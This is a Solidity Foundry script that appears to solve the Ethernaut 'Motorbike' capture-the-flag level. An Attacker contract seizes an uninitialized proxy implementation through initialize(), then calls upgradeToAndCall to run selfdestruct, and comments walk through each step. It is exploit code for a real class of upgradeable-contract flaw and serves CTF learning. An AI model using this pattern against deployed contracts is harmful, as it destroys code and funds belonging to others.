// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {DoubleEntryPoint, CryptoVault, Forta, LegacyToken} from "../src/DoubleEntryPoint.sol";
import "openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol";


/**
 * Solution:
 * =====================================================================================
 * Part 1 
 * 
 * Well honestly the first thing I did is to find the address of the Engine contract and check if "upgrader" and
 * "horsePower" are set. 
 * 
 * You can do this by simply executing
 * cast storage YOUR_INSTANCE_ADDRESS 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url YOUR_RPC_URL
 * =====================================================================================
 * Part 2 
 * 
 * Once you have the address you can check that the actual value of 
 * "upgrader" -> 0x0000000...
 * "horsePower" -> 0
 * Meaning the initialize method was not executed. 
 * 
 * =====================================================================================
 * Part 3 
 * 
 * 1. We can deploy new contract that calls "initlize()" method from the Engine contract.
 * 2. We will implement a "destroy()" method with selfdestruct 
 * 3. After the deployment we will call the "destroy()" method 
 * 
 * =====================================================================================
 * !!!!Note
 * 
 * After the Cancun upgrade "selfdestruc" is deprecated so this won't work as expected. Only the funds from 
 * Engine contract will be transferred to the recipient but the code won't be deleted. The only way to execute 
 * selfdestruct is to be executed in the same transaction as the contract was created.
 * In order to make this work take a at EIP-6780 and EIP-7702.
 * 
 */
interface IMotorbike {
    function upgrader() external view returns(address);
    function horsePower() external view returns(uint256);
}

interface IEngine {
    function upgrader() external view returns(address);
    function horsePower() external view returns(uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Attacker {
    IEngine engine;

    constructor(address _engine) {
        engine = IEngine(_engine);
        engine.initialize();
    }

    function destroyEngine() external {
        bytes memory callData = abi.encodeWithSignature("destroy()");
        engine.upgradeToAndCall(address(this), callData);
    }

    function destroy() public {
        selfdestruct(payable(address(0)));
    }
}

contract MotorbikeScript is Script {

    IMotorbike motorbike;
    IEngine engine;
    Attacker attacker;

    function run() public {    
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        motorbike = IMotorbike(0xe511d86353eF875cF1155f38d774308808DCDd02);
        // to get the engine use cast storage
        // cast storage 0xe511d86353eF875cF1155f38d774308808DCDd02 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url
        engine = IEngine(0x76320f81677dc48eAbC4E98030316BBD5ba109E9);
        console.log("First state", engine.upgrader(), engine.horsePower());
        attacker = new Attacker(address(engine));
        console.log("Second state", engine.upgrader(), engine.horsePower());
        attacker.destroyEngine(); // this won't work in Cancun upgrade.
        vm.stopBroadcast();
    }
}
